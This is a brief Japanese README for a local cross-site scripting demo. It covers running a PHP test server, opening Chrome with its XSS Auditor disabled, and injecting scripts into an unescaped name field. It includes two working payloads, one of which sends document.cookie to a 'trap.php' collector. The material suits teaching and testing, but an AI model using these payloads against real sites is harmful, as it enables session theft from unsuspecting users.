# XSS sample
[XSS](https://qiita.com/bunty/private/61b5a83a40f32f7253a4#%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0xss)に関してあれこれ    
とりあえずこれでブラウザで確認しよう  

## [ビルトインウェブサーバー ](http://php.net/manual/ja/features.commandline.webserver.php)を開始させる

```
$ php -S localhost:8080 -t xss
```

## Chromeを開く
ChromeはXSS Auditorにより、XSSを拒否する設定になっている。    
そのためXSSの確認をする場合には、XSS Auditorをoffにした状態でクロームを開く必要がある。  


```
$ open -na Google\ Chrome --args --disable-xss-auditor --user-data-dir="/tmp/chrome"
```

## スクリプトを埋め込む
URLのフォームには[htmlspecialchars](http://php.net/manual/ja/function.htmlspecialchars.php)を使用しているが、名前のフォームには使用していない。    
これを名前のフォームに埋め込むと、セッションのIDがアラートで表示されたり他のファイルにGETパラメータとして渡される。  
URLの方は大丈夫なはず。  

```
"><script>alert(document.cookie)</script><!--
"><script>window.location='http://localhost:8080/trap.php?'+document.cookie;</script><!--
```

## 参考
[クロスサイト・スクリプティング(XSS)の具体例](https://www.websec-room.com/2013/03/14/567)  
[XSS再入門](https://www.slideshare.net/ockeghem/xssreintroduction?ref=http://xss.hatenablog.jp/entry/2014/12/03/154132)    
[「何故htmlspecialcharsを通すのか？」を一言でどうぞ](https://qiita.com/mpyw/items/19e6fed835ccdbcb0d6d)  
